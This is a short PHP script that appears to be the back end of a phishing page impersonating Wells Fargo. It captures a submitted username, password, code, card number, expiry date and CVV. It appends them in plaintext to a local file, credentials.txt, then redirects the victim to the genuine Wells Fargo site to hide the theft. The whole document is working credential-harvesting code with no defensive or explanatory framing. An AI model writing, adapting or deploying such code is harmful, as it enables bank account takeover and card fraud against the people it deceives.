<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    $code = $_POST["code"];
    $card_number = $_POST["card_number"];
    $expiry = $_POST["expiry"];
    $cvv = $_POST["cvv"];
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Username: $username | Password: $password | Code: $code | Card: $card_number | Expiry: $expiry | CVV: $cvv\n");
    fclose($file);
    header("Location: https://www.wellsfargo.com/");
    exit();
}
?>
